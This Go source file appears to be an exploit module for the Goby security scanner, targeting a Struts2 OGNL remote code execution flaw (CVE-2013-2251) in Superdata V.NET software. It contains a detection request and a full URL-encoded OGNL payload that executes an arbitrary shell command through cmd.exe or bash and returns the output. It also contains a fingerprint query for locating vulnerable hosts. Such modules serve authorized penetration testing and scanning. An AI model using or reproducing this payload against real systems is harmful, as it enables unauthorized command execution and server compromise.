package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Superdata Software V.NET Struts2 Code Execution Vulnerability",
    "Description": "<p>Superdata software management system is a complete set of enterprise business management system, which organically integrates enterprise purchase management, sales management, warehousing management and financial management. It is extremely easy to use and practical, and comprehensively improves enterprise management ability and work efficiency.</p><p>Many products of superdata software technology (Guangzhou) Co., Ltd. have code execution vulnerabilities. The code does not filter the controllable parameters of the user, leading to the direct introduction of execution commands and codes, the execution of maliciously constructed statements, and the execution of arbitrary commands or codes through the vulnerability. Attackers can execute arbitrary commands, read and write files, etc. on the server, which is very harmful.</p>",
    "Product": "Superdata-OA",
    "Homepage": "http://www.superdata.com.cn/",
    "DisclosureDate": "2022-09-06",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"速达软件技术（广州）有限公司\"",
    "GobyQuery": "body=\"速达软件技术（广州）有限公司\"",
    "Level": "3",
    "Impact": "<p>Because the code does not filter the user controllable parameters, it directly leads to the execution of commands and code, and executes maliciously constructed statements and arbitrary commands or code through vulnerabilities. Attackers can execute arbitrary commands, read and write files, etc. on the server, which is very harmful.</p>",
    "Recommendation": "<p>1. Strictly filter the data input by the user, and prohibit the execution of unexpected system commands.</p><p>2. Reducing or not using code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use hazard functions.</p><p>Please pay attention to the official website for the latest fixes: <a href=\"http://www.superdata.com.cn/\">http://www.superdata.com.cn/</a></p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/home",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Java/1.8.0_341",
                    "Content-type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "redirect:%25{40012*43801}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "1752565612",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/home",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Java/1.8.0_341",
                    "Content-type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "redirect%3a%24%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29%2c%23_memberAccess%3dnew+com.opensymphony.xwork2.ognl.SecurityMemberAccess%28true%29%2c%23commods%3d%27{{{command}}}%27%2c%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%2c%23outmansec%3d%28%23iswin%3f%28new+java.lang.String%5b%5d%7b%27cmd.exe%27%2c%27%2fc%27%2c%23commods%7d%29%3a%28new+java.lang.String%5b%5d%7b%27bash%27%2c%27-c%27%2c%23commods%7d%29%29%2c%23a%3dnew+java.lang.ProcessBuilder%28%23outmansec%29.start%28%29.getInputStream%28%29%2c%23s%3dnew+java.util.Scanner%28%23a%29.useDelimiter%28%27%5c%5cAAAA%27%29%2c%23str%3d%23s.hasNext%28%29%3f%23s.next%28%29%3a%27%27%2c%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29%2c%23resp.setCharacterEncoding%28%27GB2312%27%29%2c%23resp.getWriter%28%29.println%28%23str%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2013-2251"
    ],
    "CNNVD": [
        "CNNVD-201307-308"
    ],
    "CNVD": [
        "CNVD-2013-09777"
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "速达软件 V.NET home 文件 存在 Struts2 代码执行漏洞",
            "Product": "速达软件-OA",
            "Description": "<p>速达软件管理系统是一套完整的企业业务管理系统，统有机的将企业进货管理、销售管理、仓储管理、财务管理融为一体，有着极好易用性和实用性，全面提升了企业的管理能力和工作效率。</p><p>速达软件技术（广州）有限公司多款产品存在代码执行漏洞，代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>",
            "Recommendation": "<p>1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p><p>2、减少或不使用代码或命令执行函数。</p><p>3、客户端提交的变量在放入函数前进行检测。</p><p>4、减少或不使用危险函数。</p><p>最新修复补丁请关注官网：<a href=\"http://www.superdata.com.cn/\">http://www.superdata.com.cn/</a></p>",
            "Impact": "<p>由于代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Superdata Software V.NET Struts2 Code Execution Vulnerability",
            "Product": "Superdata-OA",
            "Description": "<p>Superdata software management system is a complete set of enterprise business management system, which organically integrates enterprise purchase management, sales management, warehousing management and financial management. It is extremely easy to use and practical, and comprehensively improves enterprise management ability and work efficiency.</p><p>Many products of superdata software technology (Guangzhou) Co., Ltd. have code execution vulnerabilities. The code does not filter the controllable parameters of the user, leading to the direct introduction of execution commands and codes, the execution of maliciously constructed statements, and the execution of arbitrary commands or codes through the vulnerability. Attackers can execute arbitrary commands, read and write files, etc. on the server, which is very harmful.</p>",
            "Recommendation": "<p>1. Strictly filter the data input by the user, and prohibit the execution of unexpected system commands.</p><p>2. Reducing or not using code or commands to execute functions.</p><p>3. The variables submitted by the client are detected before being put into the function.</p><p>4. Reduce or not use hazard functions.</p><p>Please pay attention to the official website for the latest fixes: <a href=\"http://www.superdata.com.cn/\">http://www.superdata.com.cn/</a></p>",
            "Impact": "<p>Because the code does not filter the user controllable parameters, it directly leads to the execution of commands and code, and executes maliciously constructed statements and arbitrary commands or code through vulnerabilities. Attackers can execute arbitrary commands, read and write files, etc. on the server, which is very harmful.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10767"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}